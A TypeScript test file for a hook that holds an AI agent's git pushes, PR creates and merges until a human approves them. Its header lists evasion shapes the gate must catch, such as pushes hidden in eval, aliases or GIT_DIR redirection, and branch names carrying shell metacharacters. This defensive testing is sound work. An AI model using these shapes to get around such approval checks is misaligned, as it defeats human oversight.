/**
 * decision-gate in app folders (card coord-decision-gate-app-repos, rules R1 to R10, Dave's taps D1 a and D2 a, seat conditions G1 and G3).
 * A folder outside CCv3 is judged when tap-scope.ts says it is covered: its git toplevel (or the main root of its worktree) is the root of a
 * live registry entry. git, the router config and the registry are small fakes (as decision-gate.test.ts); the decision store is a real temp file.
 *
 * Each case names the source change that turns it red:
 *   C1  a covered push, create or merge passes with no tap                         -> drop the coverage call (judge* return ALLOW again)
 *   C2  a tap of repo X licenses the same branch, tree, head or PR in repo Y         -> a constant key repo (decisionKey without repo)
 *   C3  a mixed-case remote URL makes a key the offer writer never writes           -> keep the case of the remote URL in the key
 *   C4  popd, cd - or a bare cd before a shape passes in a covered folder           -> the position test back to CCv3 only
 *   C5  an unregistered, inactive, off, ccv3-root, nested inactive or plain-under-CCv3 folder is judged -> skip a coverage reason
 *   C6  (seat review 1, item 4) registry corrupt passes, or registry missing denies, or a missing file named by LANE_REGISTRY_PATH is
 *       silent -> passOf returns the allow again; deny on missing; drop the envPath notice
 *   C7  a covered push only warns by default, or the flag turns it off with a non-literal false (D2 a, G1) -> read enforceAppPush as a true flag
 *   C8  a remote is banned (origin), main passes, force or a subagent push passes, a push with no remote is judged on a guess (R5b, R6)
 *   C9  a create or merge that names another repo is judged with the folder key (R5c), also from a CCv3 folder
 *   C10 the label "Merge now (no READY check)" works in CCv3 (G3), or a covered merge takes "Land now" or no sha
 *   C11 a covered deny text names a CCv3 tool, a relative script path, fork, origin, parcadei, tapGate or how to switch the gate off (R9, S6)
 *   C12 a git throw after coverage is known keeps scope push (warns) instead of app-push (denies)
 *   C13 a Deps with no tapScope field judges a folder outside CCv3 (the old tests would break)
 *   C14 a --body, heredoc or chained gh call names a repo, or a quoted -R / api path / PR URL, a -R after a quoted ; or a 2>&1, or a
 *       second merge of one PR is lost (F1) -> cmdRepoOf on the whole text; masked view only; a raw or redirect cut; merge id without its text
 *   C15 a CCv3 URL in a --body puts a covered create or merge on the CCv3 rule (R9) -> routeOf takes the CCv3 rule on namedRepo alone
 *   C16 a push -C path with backslashes reads as C:repo, a folder that does not exist -> squashQuotes on the -C value, or the squashed-view copy kept
 *   C17 F2: a branch with ; $( or a backtick runs from an offer command, or U+202E reaches a text -> askCmd takes the value raw; prose without oneLine
 *   C18 S5: the registry line is lost when the same call warns or denies -> decide() drops the notes beside a deny
 *   C19 F8: an unregistered folder starts git for coverage, or a network root is resolved -> drop the path pre-check; realpath every root
 *   C20 a folder is read twice in one call, or git runs past the deadline -> drop perCall; makeGit ignores the deadline
 *   C12 (fix round 1) a git throw before coverage keeps scope push under a live root -> drop the path test in unjudgeable or coveredAmong
 *   C21 (fix round 1, fixer C) a deny's own offer command, run through the real app-ask plan, records a key the gate does not read: a bare,
 *       other-branch, refspec or URL push, nothing ahead, a remote name with /, two remotes, an SSH alias, a split fetch and push URL
 *       -> drop --branch or --src from the push text; key a create on the push URL; ignore the github field; @{push} split on the first /
 *   C22 (Dave 11-13, fixer E) a covered push to a branch that is not main, master or the remote HEAD branch passes with no tap and no tree
 *       read; a push to a default branch, a force, delete or subagent push, and an unresolved destination stay denied
 *       -> drop the branch test; drop master or the remote HEAD read; move the test above force or subagent; split the remote HEAD on the first /
 *   C16 (fixer E, item 7) one push with a backslash -C path is ONE shape, and two spellings of one folder collapse to one shape
 *       -> key the push id on the raw -C value (not the squashed one)
 *   C23 (fix round 2, fixer F) the no-tap allow fails closed: a glob or shell-expanded refspec, --repo, a bare push widened by git config,
 *       a local tag, a split remote, no readable remote HEAD and a URL that is no remote take the tap path; @ after a chained commit reads
 *       the index -> drop the literal test, the config read, the tag test, the HEAD fail-closed rule, the slug match or the @ fold
 *   C24 (fix round 2, fixer G) 1 a CCv3 gh segment naming another repo is judged with the CCv3 key when the text holds a CCv3 URL; 2 a
 *       CCv3 call reaches coverage; 3 a CCv3 text or head read differs from base; 4 an unsafe value gets a placeholder or quoting advice;
 *       5 an earlier GH_REPO is not read; 6 an https mirror takes the github field; 7 an SSH alias with no github field is a dead end
 *       -> routeOf tests namedRepo first; appPlace before isCcv3Checkout; openPrWhy placeholder or the redirect cut for CCv3; the old askCmd;
 *          commandRepo without the earlier segments; HOST_TAIL on any scheme; drop the github-field line
 *   C25 (fix round 3, fixer H) 1 a push off the strict allow-list (a splat @b, git -c, GIT_CONFIG_*, a lead-in, tags/<n>, a local or
 *       source tag, --follow-tags, push.followtags, a remote.<r>.push mapping, an unlisted option, a name rule) skips the tap; 2 a true
 *       mirror or a + remote.<r>.push takes the tap path, or --repo does; 4 a CCv3 git call gets the 7 s deadline, or an app call does
 *       not; 6 an SSH form on gitlab.com takes the github field
 *       -> the old literal reading; send the hard denies to the tap path; one git runner for both paths; sshTail with no host test
 *   C26 (fix round 4, fixer K) 1 push config or a command option that makes git write more than the branch the tap names (a colon-less
 *       remote.<r>.push mapping, push.default=matching on a bare push, submodule recursion, followTags, -c push keys) takes the tap path,
 *       or matching over-denies a positional push, or the way out dead-ends; 2 a global option PUSH_GIT does not read hides the push;
 *       3 a prefix of an unsafe long option, or a short bundle with o, escapes push-unsafe; 5 a source word that is no plain ref says
 *       "run again" -> configKind by effect; hiddenPushDenies; UNSAFE_LONG prefixes and the o cut; appTreeWhy plain test.
 *   R5  (fix round 5, fixer M; seat reviewer on 785138fd, rulings A B C) each R5 F<n> row was red on 785138fd before the fix:
 *       F1 a push option value hides -n/-h/-f; F2 a push in a control word, substitution, sh -c, eval or git alias; F3 GIT_DIR or
 *       --git-dir at an app repo from a CCv3 or unregistered cwd; F4 a -C chain; F5 enforceAppPush read from the app repo; F6 Main,
 *       MASTER, Develop; F7 60 runs of a long hostile command over 1 s (WIDE_OPT backtracking); F8 an open-pr tap for one base licenses
 *       another -> quiet outside the strict reader; drop rawPushDenies; judge the move in the cwd only; last -C only; cwd-upward flag
 *       read; case-sensitive compare; overlapping option alternatives; openPrKey without the base.
 *   Re-pinned by fixer P (fix round 6, the verb rule; rows in decision-gate-app-repos-verb.test.ts): C11 R5 F4 (-C /work -C app-x from a
 *       CCv3 cwd: the old row named one folder twice and could not fail), C11 and ruling A test -f / [ -d ] / chmod +x (the tap path,
 *       allowed with the tap), R5 F2 alias -f (the tap path, not push-unsafe; seat ruling c, 11-13, made it push-unsafe again).
 *   Re-pinned by fixer M: C12 the GIT_DIR row of an unregistered cwd (an app-repo GIT_DIR now denies, scope app-push; /x/.git keeps scope
 *       push); C26 item 2 'a dry run behind a hidden global option' (it was a pass: quiet is read only inside the strict reader); C1 the
 *       create-from-main and REST create rows and C15 the --base dev row (F8: the tap key holds the base). deps() serves the config at
 *       <home>/continuous-claude too (ruling C) and an app-repo config file for R5 F5 (appConfig).
 *   Re-pinned by fixer K: C23 matching / remote.up.push bare rows, C25 -c, --follow-tags, push.followTags and the colon-less mapping rows
 *       (tap path -> push-target-unresolved); the CONFIG_TEXT row is dropped (no row needed it) and its commands joined the lead-in row.
 *   Re-pinned by fixer H (strict allow-list; each row names why): C22 main:feat, feat topic, @ on feat, the URL target and team/fork
 *       feat; C23 the literal-forms row, the mirror rows (push-unsafe), the --repo rows (push-target-unresolved), the URL text row.
 *   Re-pinned by fixer G: C17 (the placeholder and single-quote rows, the CCv3 text row, the URL remote row), C11 BANNED adds quoting advice.
 *   Re-pinned by fixer F (they pinned a fail-open allow): C22 URL target (now takes the HEAD of the remote with its slug), and the
 *   remote HEAD output row (an empty line and a missing remote HEAD now take the tap path).
 * The fake remote HEAD of every configured remote is feat (Folder.remoteHead), so the push rows of C1 to C21 push a default branch and keep
 * testing the tap path. Rows re-pinned by fixer E (a URL target has only main and master; release is no default): C8 URL remote, C17 URL
 * remote and odd-branch push, C21 HEAD:release, URL remote, two non-GitHub targets and the gitlab URL.
 */
import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { cpuBest, cpuBestAsync, cpuMs, cpuTimed } from './helpers/cpu-time.js';
import { decisionRecord, offerWrite, type Step } from '../shared/decisions-store.js';
import { readRegistry } from '../shared/tap-scope.js';
import { GitDeadlineError, MissingCwdError, decide, handle, makeGit, pushShapesOf, realDeps, withParsed, type Decision, type Deps } from '../decision-gate.js';
// @ts-ignore TS7016: app-ask.mjs has no declaration file. The REAL offer writer: C21 takes every key from it, never by hand.
import * as appAsk from '../../../../scripts/github/app-ask.mjs';
import { decideParsed, handleParsed } from './helpers/parse-first.js';

const HEAD = 'a'.repeat(40);
const HEAD2 = 'c'.repeat(40);
const TREE = 't'.repeat(40);
const CCV3_URL = 'https://github.com/Rev4nchist/Continuous-Claude-v3.git';
// Seat review 1, item 6: the script path is in single quotes.
const ASK = "node '/home/tester/continuous-claude/scripts/github/app-ask.mjs'";
let scratch = '';
let storeFile = '';
const saved: Record<string, string | undefined> = {};
const ENV_KEYS = ['CCV3_DECISIONS_FILE', 'LANE_REGISTRY_PATH', 'CCV3_GUARD_DECISIONS_LOG'];

beforeEach(() => {
  scratch = mkdtempSync(join(tmpdir(), 'dg-app-')).replace(/\\/g, '/');
  storeFile = `${scratch}/decisions.json`;
  for (const k of ENV_KEYS) saved[k] = process.env[k];
  process.env.CCV3_DECISIONS_FILE = storeFile;
  process.env.LANE_REGISTRY_PATH = `${scratch}/no-registry.json`;
  delete process.env.CCV3_GUARD_DECISIONS_LOG;
});
afterEach(() => {
  for (const k of ENV_KEYS) { if (saved[k] === undefined) delete process.env[k]; else process.env[k] = saved[k]; }
  rmSync(scratch, { recursive: true, force: true });
});

interface Folder {
  remotes?: Record<string, string>; pushUrls?: Record<string, string | string[]>; top?: string; common?: string; branch?: string;
  heads?: Record<string, string>; trees?: Record<string, string>; pushRef?: string; indexTree?: string;
  /** Staged file names (git diff --cached --name-only) and the count of commits not on the remote (git rev-list --count). */
  staged?: string[]; ahead?: number;
  /** git args (joined by a space) that throw, as a spawn error does. */
  throwOn?: string[];
  /**
   * The branch refs/remotes/<remote>/HEAD names, for every configured remote (git symbolic-ref --quiet --short). Default feat, so the
   * push rows of C1 to C21 push a default branch and stay on the tap path (Dave 11-13, C22). null: no remote HEAD (status 1).
   */
  remoteHead?: string | null;
  /** The raw stdout of that symbolic-ref call, when a row needs another form (remotes/up/develop, an empty line). */
  remoteHeadOut?: string;
  /** Local tag names (git show-ref --verify --quiet refs/tags/<name> exits 0 for each). */
  tags?: string[];
  /** The stdout of git config --get-regexp for the push keys; absent: no key set (status 1). `configStatus` overrides the status. */
  config?: string;
  configStatus?: number;
}
const gh = (slug: string): Record<string, string> => ({ up: `https://github.com/${slug}.git` });
const FOLDERS: Record<string, Folder> = {
  '/work/app-x': { remotes: gh('acme/app-x') },
  '/work/app-x/src': { remotes: gh('acme/app-x'), top: '/work/app-x' },
  '/work/app-y': { remotes: gh('acme/app-y') },
  '/work/wt-x': { remotes: gh('acme/app-x'), common: '/work/app-x/.git' },
  '/work/app-x/nested': { remotes: gh('acme/nested') },
  '/work/old-app': { remotes: gh('acme/old-app') },
  '/work/off-app': { remotes: gh('acme/off-app') },
  '/work/stray': { remotes: gh('acme/stray') },
  '/work/ccroot': { remotes: { origin: 'https://github.com/parcadei/continuous-claude.git' } },
  '/work/cc': { remotes: { fork: CCV3_URL } },
  '/work/cc/plain': { remotes: gh('acme/plain') },
  '/work/two': { remotes: { up: 'https://github.com/acme/two.git', mirror: 'https://github.com/acme/two-mirror.git' } },
  '/work/local': { remotes: { up: '/srv/git/local.git' } },
  '/work/mixed': { remotes: { up: 'https://github.com/Acme/Mixed-Case.git' } },
  '/work/ccroot/apps/agentic': { remotes: { origin: 'https://github.com/parcadei/continuous-claude.git' }, top: '/work/ccroot' },
  "/work/it's": { remotes: gh('acme/quote') },
  '/work/alias': { remotes: { origin: 'git@github-work:Acme/Alias.git' } },
  '/work/split': { remotes: { origin: 'https://github.com/acme/upstream.git' }, pushUrls: { origin: 'https://github.com/me/fork.git' } },
  '/work/multi': { remotes: gh('acme/multi'), pushUrls: { up: ['https://github.com/acme/multi.git', 'https://github.com/acme/other.git'] } },
  '/work/slash': { remotes: { 'team/fork': 'https://github.com/acme/slash.git' } },
};
const REGISTRY = {
  projects: [
    { key: 'app-x', path: '/work/app-x' },
    { key: 'app-y', path: '/work/app-y' },
    { key: 'continuous-claude', path: '/work/ccroot' },
    { key: 'old-app', path: '/work/old-app', status: 'inactive' },
    { key: 'nested', path: '/work/app-x/nested', status: 'Inactive' },
    { key: 'off-app', path: '/work/off-app', tapGate: ' OFF ' },
    { key: 'two', path: '/work/two' },
    { key: 'local-app', path: '/work/local' },
    { key: 'mixed', path: '/work/mixed' },
    { key: 'agentic', path: '/work/ccroot/apps/agentic' },
    { key: 'quote-app', path: "/work/it's" },
    { key: 'alias', path: '/work/alias', github: 'Acme/Alias' },
    { key: 'split', path: '/work/split' },
    { key: 'multi', path: '/work/multi' },
    { key: 'slash', path: '/work/slash' },
  ] as { key: string; path: string; status?: string; tapGate?: string; github?: string }[],
};

interface World {
  folders?: Record<string, Folder>;
  /** Registry file text; null = the file is missing; undefined = REGISTRY. */
  registry?: string | null;
  /** Seat review 1, item 4: the registry file is named by LANE_REGISTRY_PATH (readRegistry env), not by the path argument. */
  registryEnv?: boolean;
  /**
   * Router config text at /work and at <home>/continuous-claude (fix round 5, ruling C: enforceAppPush is read from the home copy only);
   * null = no config anywhere.
   */
  config?: string | null;
  /** CLI run 2 of C2b: the router config text of the home copy only (the checkout copy at /work keeps `config`). */
  homeConfig?: string;
  /** R5 F5: a router config file inside the app repo /work/app-x (the gate must not read enforceAppPush from it). */
  appConfig?: string;
  /** No tapScope field at all (the shape of every old test). */
  noScope?: boolean;
  calls?: string[];
  /** The realpath of the registry reader and of coverageOf (default: the path itself). */
  realpath?: (p: string) => string;
}
const errno = (code: string): Error => Object.assign(new Error(code), { code });
const same = (p: string): string => p;
const slash = (p: string): string => p.replace(/\\/g, '/');
/** The files the no-git worktree walk reads: /work/wt-x is a linked worktree of /work/app-x (a .git FILE), every other folder has none. */
const GIT_FILES: Record<string, string> = {
  '/work/wt-x/.git': 'gitdir: /work/app-x/.git/worktrees/wt-x\n',
  '/work/app-x/.git/worktrees/wt-x/commondir': '../..\n',
};
const fakeFile = (p: string): string => { const t = GIT_FILES[slash(p)]; if (t === undefined) throw errno('ENOENT'); return t; };

function remoteV(f: Folder): string {
  return Object.entries(f.remotes ?? {}).map(([n, u]) => `${n}\t${u} (fetch)\n${n}\t${u} (push)\n`).join('');
}

/** One fake git answer for a folder. Status 1 for anything not listed. */
function answer(f: Folder, dir: string, a: string): { status: number; stdout: string } {
  const ok = (s: string) => ({ status: 0, stdout: `${s}\n` });
  if (a === 'remote -v') return { status: 0, stdout: remoteV(f) };
  if (a === 'remote') return ok(Object.keys(f.remotes ?? {}).join('\n'));
  if (a === 'rev-parse --path-format=absolute --show-toplevel --git-common-dir') return ok(`${f.top ?? dir}\n${f.common ?? `${f.top ?? dir}/.git`}`);
  const pushList = (name: string): string[] | null => { const p = f.pushUrls?.[name]; return p ? [p].flat() : f.remotes?.[name] ? [f.remotes[name]] : null; };
  // Seat review 1, item 5: repo-identity.mjs puts --end-of-options before the remote word.
  const ga = /^remote get-url --push --all (?:--end-of-options )?(.+)$/.exec(a);
  if (ga) { const l = pushList(ga[1]); return l ? ok(l.join('\n')) : { status: 2, stdout: '' }; }
  const gp = /^remote get-url --push (?:--end-of-options )?(.+)$/.exec(a);
  if (gp) { const l = pushList(gp[1]); return l ? ok(l[0]) : { status: 2, stdout: '' }; }
  const gu = /^remote get-url (?:--end-of-options )?(.+)$/.exec(a);
  if (gu) return f.remotes?.[gu[1]] ? ok(f.remotes[gu[1]]) : { status: 2, stdout: '' };
  if (a === 'rev-parse --abbrev-ref @{push}') return f.pushRef ? ok(f.pushRef) : { status: 128, stdout: '' };
  if (a === 'rev-parse --symbolic-full-name @{push}') return f.pushRef ? ok(`refs/remotes/${f.pushRef}`) : { status: 128, stdout: '' };
  const sr = /^symbolic-ref --quiet --short refs\/remotes\/(.+)\/HEAD$/.exec(a);
  if (sr) {
    if (!f.remotes?.[sr[1]] || f.remoteHead === null) return { status: 1, stdout: '' };
    return ok(f.remoteHeadOut ?? `${sr[1]}/${f.remoteHead ?? 'feat'}`);
  }
  const tag = /^show-ref --verify --quiet refs\/tags\/(.+)$/.exec(a);
  if (tag) return f.tags?.includes(tag[1]) ? { status: 0, stdout: '' } : { status: 1, stdout: '' };
  if (a.startsWith('config --get-regexp ')) return f.config === undefined ? { status: f.configStatus ?? 1, stdout: '' } : { status: f.configStatus ?? 0, stdout: `${f.config}\n` };
  if (a === 'branch --show-current') return ok(f.branch ?? 'feat');
  if (a === 'write-tree') return f.indexTree ? ok(f.indexTree) : { status: 128, stdout: '' };
  if (a === 'diff --cached --name-only') return ok((f.staged ?? []).join('\n'));
  if (a.startsWith('rev-list --count ')) return ok(String(f.ahead ?? 1));
  const heads = f.heads ?? { feat: HEAD, main: HEAD2 };
  if (a === 'rev-parse HEAD') return heads[f.branch ?? 'feat'] ? ok(heads[f.branch ?? 'feat']) : { status: 128, stdout: '' };
  // Seat review 1, items 3 and 5: app-ask puts --end-of-options before a ref (with --verify), and the app Push only tap reads
  // <ref>^{commit} (HEAD too).
  const v = /^rev-parse --verify --quiet (?:--end-of-options )?(.+)\^\{commit\}$/.exec(a);
  if (v) { const name = v[1] === 'HEAD' ? f.branch ?? 'feat' : v[1].replace(/^refs\/heads\//, ''); return heads[name] ? ok(heads[name]) : { status: 1, stdout: '' }; }
  const c = /^rev-parse (?:--verify )?(?:--end-of-options )?(.+)\^\{commit\}$/.exec(a);
  const cname = c ? (c[1] === 'HEAD' ? f.branch ?? 'feat' : c[1].replace(/^refs\/heads\//, '')) : '';
  if (c && heads[cname]) return ok(heads[cname]);
  const t = /^rev-parse (?:--verify )?(?:--end-of-options )?(.+)\^\{tree\}$/.exec(a);
  const trees = f.trees ?? { HEAD: TREE, feat: TREE, main: TREE };
  const tname = t ? t[1].replace(/^refs\/heads\//, '') : '';
  if (t && trees[tname]) return ok(trees[tname]);
  return { status: 1, stdout: '' };
}

function deps(w: World = {}): Deps {
  const folders = w.folders ?? FOLDERS;
  const config = w.config !== undefined ? w.config : JSON.stringify({ decisions: { enforce: true } });
  const regText = w.registry !== undefined ? w.registry : JSON.stringify(REGISTRY);
  const d: Deps = {
    env: { ...process.env, CCV3_DECISIONS_FILE: storeFile },
    home: '/home/tester',
    readFile: (p) => {
      const f = slash(p);
      if (f === '/work/app-x/review-router.config.json') return w.appConfig ?? null;
      if (f === '/home/tester/continuous-claude/review-router.config.json') return w.homeConfig ?? config;
      return f === '/work/review-router.config.json' ? config : null;
    },
    git: (cwd, args) => {
      const dir = slash(cwd);
      const a = args.join(' ');
      w.calls?.push(`${dir}: ${a}`);
      const f = folders[dir];
      if (!f) return { status: 128, stdout: '' };
      if (f.throwOn?.includes(a)) throw new Error(`spawnSync git ETIMEDOUT (${a})`);
      return answer(f, dir, a);
    },
  };
  if (w.noScope) return d;
  const readFile = (): string => { if (regText === null) throw errno('ENOENT'); return regText; };
  const realpath = w.realpath ?? same;
  const where = w.registryEnv ? { env: { LANE_REGISTRY_PATH: '/reg/project-registry.json' } } : { path: '/reg/project-registry.json' };
  return { ...d, tapScope: { registry: () => readRegistry({ ...where, deps: { readFile, realpath } }), realpath, readFile: fakeFile } };
}

function tap(step: Step, key: string, head: string, label: string, tree?: string): void {
  expect(offerWrite({ step, key, head, tree, spec: { header: 'T', question: 'Q?', options: [{ label }, { label: 'Another option' }] } }).ok).toBe(true);
  expect(decisionRecord({ step, key, head, label })).toEqual({ ok: true });
}
const bash = (command: string, cwd = '/work/app-x', extra: Record<string, unknown> = {}) => ({ tool_name: 'Bash', tool_input: { command }, cwd, session_id: 's-app', ...extra });
const verdict = async (input: object, w?: World): Promise<Decision> => await decideParsed(input, deps(w));
const denyOf = async (input: object, w?: World): Promise<{ pattern: string; scope: string; reason: string } | null> => {
  const d = await verdict(input, w);
  return d.action === 'deny' ? { pattern: d.pattern, scope: d.scope, reason: d.reason } : null;
};
const passes = async (input: object, w?: World): Promise<boolean> => { const d = await verdict(input, w); return d.action === 'allow' && !d.warn; };

const CORRUPT_LINE = 'WARNING (decision-gate): the project registry /reg/project-registry.json cannot be read. Tell Dave.';
const PUSH = 'git push up feat';
const CREATE = 'gh pr create --draft --head feat --title t --body-file b.md';
const MERGE = `gh pr merge 7 --squash --match-head-commit ${HEAD}`;
const shipX = (label = 'Commit and push', branch = 'feat', repo = 'acme/app-x') => tap('ship', `${repo}@${branch}`, HEAD, label, TREE);
const openX = (repo = 'acme/app-x') => tap('open-pr', `${repo}@feat`, HEAD, 'Open draft PR (Recommended)');
const mergeX = (repo = 'acme/app-x', label = 'Merge now (no READY check)') => tap('land', `${repo}#7`, HEAD, label);

describe('C1 a covered folder judges push, create and merge (R2, R3, R4)', () => {
  it('denies a push with no tap, scope app-push, and allows it after "Commit and push" for this repo, branch and tree', async () => {
    expect(await denyOf(bash(PUSH))).toMatchObject({ pattern: 'ship', scope: 'app-push' });
    shipX();
    expect(await passes(bash(PUSH))).toBe(true);
  });
  it('allows "Push only" for a bare push, never for a commit and push in one command', async () => {
    shipX('Push only');
    expect(await passes(bash(PUSH))).toBe(true);
    expect((await denyOf(bash(`git commit -m x && ${PUSH}`), { folders: { ...FOLDERS, '/work/app-x': { remotes: gh('acme/app-x'), indexTree: TREE } } }))?.pattern).toBe('ship');
  });
  it('denies a create with no tap, scope other, and allows it after "Open draft PR"', async () => {
    expect(await denyOf(bash(CREATE))).toMatchObject({ pattern: 'open-pr', scope: 'other' });
    openX();
    expect(await passes(bash(CREATE))).toBe(true);
  });
  it('denies a create from main with no tap (no main exception outside CCv3), and allows it after its tap', async () => {
    const fromMain = 'gh pr create --draft --head main --base release --title t';
    expect((await denyOf(bash(fromMain)))?.pattern).toBe('open-pr');
    // Fix round 5 re-pin (F8): the key holds the base the create names (acme/app-x@main:release).
    tap('open-pr', 'acme/app-x@main:release', HEAD2, 'Open draft PR');
    expect(await passes(bash(fromMain))).toBe(true);
  });
  it('the REST create form: denied with no tap, allowed after it, repo-differs for another repo', async () => {
    const rest = (repo: string) => `gh api repos/${repo}/pulls -X POST -f head=feat -f base=main -f title=t -F draft=true`;
    expect(await denyOf(bash(rest('acme/app-x')))).toMatchObject({ pattern: 'open-pr', scope: 'other' });
    // Fix round 5 re-pin (F8): -f base=main is in the key (acme/app-x@feat:main); the tap with no base no longer licenses it.
    openX();
    expect(await passes(bash(rest('acme/app-x')))).toBe(false);
    tap('open-pr', 'acme/app-x@feat:main', HEAD, 'Open draft PR');
    expect(await passes(bash(rest('acme/app-x')))).toBe(true);
    expect((await denyOf(bash(rest('other/lib'))))?.pattern).toBe('repo-differs');
  });
  it('denies a merge with no tap, and allows it after "Merge now (no READY check)" with the tapped head', async () => {
    expect(await denyOf(bash(MERGE))).toMatchObject({ pattern: 'land', scope: 'other' });
    mergeX();
    expect(await passes(bash(MERGE))).toBe(true);
    expect(await passes(bash(`gh api -X PUT repos/acme/app-x/pulls/7/merge -f sha=${HEAD}`))).toBe(true);
  });
  it('judges a subfolder of a covered root (the toplevel is the root)', async () => {
    expect((await denyOf(bash(PUSH, '/work/app-x/src')))?.pattern).toBe('ship');
  });
  it('judges a worktree of a covered root (its main root is the root)', async () => {
    expect((await denyOf(bash(PUSH, '/work/wt-x')))?.pattern).toBe('ship');
    shipX();
    expect(await passes(bash(PUSH, '/work/wt-x'))).toBe(true);
  });
  it('judges a covered folder reached by an absolute cd from an uncovered one', async () => {
    expect((await denyOf(bash(`cd /work/app-x && ${PUSH}`, '/work/stray')))?.pattern).toBe('ship');
  });
});

describe('C2 C3 the key holds the repo (R5)', () => {
  // Repos X and Y: the same branch, the same tree, the same head and the same PR number. Only the key separates them.
  it('a tap in X licenses X only: push, create and merge in Y stay denied', async () => {
    shipX(); openX(); mergeX();
    expect(await passes(bash(PUSH))).toBe(true);
    expect(await passes(bash(CREATE))).toBe(true);
    expect(await passes(bash(MERGE))).toBe(true);
    expect((await denyOf(bash(PUSH, '/work/app-y')))?.pattern).toBe('ship');
    expect((await denyOf(bash(CREATE, '/work/app-y')))?.pattern).toBe('open-pr');
    expect((await denyOf(bash(MERGE, '/work/app-y')))?.pattern).toBe('land');
  });
  it('a CCv3 tap for the same branch and tree does not license a covered push, and a covered tap does not license a CCv3 push', async () => {
    tap('ship', 'Rev4nchist/Continuous-Claude-v3@feat', HEAD, 'Commit and push', TREE);
    expect((await denyOf(bash(PUSH)))?.pattern).toBe('ship');
    const w: World = { config: JSON.stringify({ decisions: { enforce: true, enforcePush: true } }) };
    expect(await passes(bash('git push fork feat', '/work/cc'), w)).toBe(true);
    rmSync(storeFile, { force: true });
    shipX();
    expect((await denyOf(bash('git push fork feat', '/work/cc'), w))?.pattern).toBe('ship');
  });
  it('the key repo is lowercased: a remote https://github.com/Acme/Mixed-Case.git matches a tap for acme/mixed-case', async () => {
    tap('ship', 'acme/mixed-case@feat', HEAD, 'Commit and push', TREE);
    expect(await passes(bash(PUSH, '/work/mixed'))).toBe(true);
  });
  it('a remote that is no GitHub URL keys as local:<entry key>:<target> (fix round 1: one key per non-GitHub target)', async () => {
    expect((await denyOf(bash(PUSH, '/work/local')))?.pattern).toBe('ship');
    tap('ship', 'local:local-app@feat', HEAD, 'Commit and push', TREE);
    expect((await denyOf(bash(PUSH, '/work/local')))?.pattern).toBe('ship');
    tap('ship', 'local:local-app:/srv/git/local.git@feat', HEAD, 'Commit and push', TREE);
    expect(await passes(bash(PUSH, '/work/local'))).toBe(true);
  });
});

describe('C5 what is not covered passes, as today (R10)', () => {
  const rows: [string, string][] = [
    ['unregistered', '/work/stray'], ['inactive entry', '/work/old-app'], ['tapGate off', '/work/off-app'],
    ['the continuous-claude entry that is no CCv3 checkout', '/work/ccroot'],
    ['a nested inactive entry inside a covered root (does not fall to its parent)', '/work/app-x/nested'],
    ['a plain repo under the CCv3 root', '/work/cc/plain'],
  ];
  for (const [name, dir] of rows) {
    it(`${name}: push, create and merge pass`, async () => {
      for (const cmd of [PUSH, CREATE, MERGE]) expect(await passes(bash(cmd, dir)), `${name}: ${cmd}`).toBe(true);
    });
  }
  it('C13 a Deps with no tapScope field judges nothing outside CCv3 and runs no git beyond remote -v', async () => {
    const calls: string[] = [];
    for (const cmd of [PUSH, CREATE, MERGE]) expect(await passes(bash(cmd), { noScope: true, calls }), cmd).toBe(true);
    expect(calls.every((c) => c.endsWith(': remote -v')), calls.join(' | ')).toBe(true);
  });
  it('a CCv3 folder never reads the registry', async () => {
    let reads = 0;
    const d = deps();
    const counted: Deps = { ...d, tapScope: { ...d.tapScope!, registry: () => { reads++; return d.tapScope!.registry(); } } };
    tap('ship', 'Rev4nchist/Continuous-Claude-v3@feat', HEAD, 'Commit and push', TREE);
    await decideParsed(bash('git push fork feat', '/work/cc'), counted);
    await decideParsed(bash(`gh pr merge 7 --match-head-commit ${HEAD}`, '/work/cc'), counted);
    expect(reads).toBe(0);
  });
});

// Seat review 1, item 4 (re-pinned; the S5 rows pinned "corrupt = pass"): a registry that exists but does not parse (read twice) DENIES a
// push, a PR create and a merge in every folder outside CCv3, with a text that names the file and the way out. A missing file stays an
// allow; it is silent, or carries the one notice line when LANE_REGISTRY_PATH names it. A CCv3 checkout keeps its old behaviour.
describe('C6 registry missing passes (a notice when LANE_REGISTRY_PATH names it); registry corrupt denies outside CCv3 (seat review 1, item 4)', () => {
  it('missing, named by the argument or the home copy: the hook prints {}', async () => {
    expect(await handleParsed(JSON.stringify(bash(PUSH)), deps({ registry: null }))).toBe('{}');
  });
  // Change that breaks it: drop the notice for a missing file named by LANE_REGISTRY_PATH, or deny it.
  it('missing, named by LANE_REGISTRY_PATH: the call passes with the one notice line and a guard-log row', async () => {
    process.env.CCV3_GUARD_DECISIONS_LOG = `${scratch}/guard.jsonl`;
    for (const cmd of [PUSH, CREATE, MERGE]) {
      const out = JSON.parse(await handleParsed(JSON.stringify(bash(cmd)), deps({ registry: null, registryEnv: true })));
      expect(out.hookSpecificOutput.permissionDecision, cmd).toBeUndefined();
      expect(out.hookSpecificOutput.additionalContext, cmd).toBe(CORRUPT_LINE);
    }
    const rows = readFileSync(`${scratch}/guard.jsonl`, 'utf8').trim().split('\n').map((l) => JSON.parse(l));
    expect(rows.map((r) => r.reason.split(' ')[0])).toEqual(['registry-missing', 'registry-missing', 'registry-missing']);
    expect(rows.every((r) => r.decision === 'warn')).toBe(true);
  });
  for (const [name, text] of [['bad JSON', '{not json'], ['projects is no list', '{"projects":{}}']] as const) {
    // Change that breaks it: corrupt passes again (passOf returns an allow with the notice), or the text names no file or no way out.
    it(`corrupt (${name}): push, create and merge are denied in a registered and an unregistered folder; the text names the file and the way out`, async () => {
      process.env.CCV3_GUARD_DECISIONS_LOG = `${scratch}/guard.jsonl`;
      for (const cwd of ['/work/app-x', '/work/stray']) {
        for (const [cmd, scope] of [[PUSH, 'app-push'], [CREATE, 'other'], [MERGE, 'other']] as const) {
          const r = await denyOf(bash(cmd, cwd), { registry: text });
          expect(r, `${cwd} ${cmd}`).toMatchObject({ pattern: 'registry-corrupt', scope });
          expect(r!.reason).toContain('/reg/project-registry.json');
          expect(r!.reason).toContain(cwd);
          expect(r!.reason).toMatch(/fix the file .* or ask Dave/i);
        }
      }
      const out = JSON.parse(await handleParsed(JSON.stringify(bash(PUSH)), deps({ registry: text })));
      expect(out.hookSpecificOutput.permissionDecision).toBe('deny');
      const rows = readFileSync(`${scratch}/guard.jsonl`, 'utf8').trim().split('\n').map((l) => JSON.parse(l));
      expect(rows.map((r) => `${r.decision} ${r.reason}`)).toEqual(['deny registry-corrupt']);
